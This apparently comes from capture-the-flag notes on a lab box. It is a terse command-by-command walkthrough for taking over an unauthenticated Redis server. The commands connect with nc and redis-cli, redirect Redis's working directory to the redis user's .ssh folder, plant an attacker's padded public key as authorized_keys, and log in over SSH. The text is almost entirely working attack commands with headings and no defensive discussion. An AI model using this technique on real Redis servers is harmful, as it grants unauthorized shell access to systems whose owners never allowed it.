# install tool 

    apt-get install redis-tools

# test redis connection

    root@kali# nc 10.10.10.160 6379
    keys *
    *0

# connect using redis-tools

    redis-cli -h 10.10.10.160 
    10.10.10.160:6379> keys *
    (empty list or set)

# pwd in redis

    10.10.10.160:6379> config get dir
    1) "dir"
    2) "/var/lib/redis"

# cd and pwd in redis

    10.10.10.160:6379> config set dir ./.ssh
    OK
    10.10.10.160:6379> config get dir
    1) "dir"
    2) "/var/lib/redis/.ssh"

# set ssh pub key 

    root@kali# (echo -e "\n\n"; cat ~/id_rsa_generated.pub; echo -e "\n\n") > spaced_key.txt

# upload ssh pub key

    root@kali# cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set 0xdf
    OK

# save pub key

    10.10.10.160:6379> config set dbfilename "authorized_keys"
    OK
    10.10.10.160:6379> save
    OK

# ssh -i ~/id_rsa_generated redis@10.10.10.160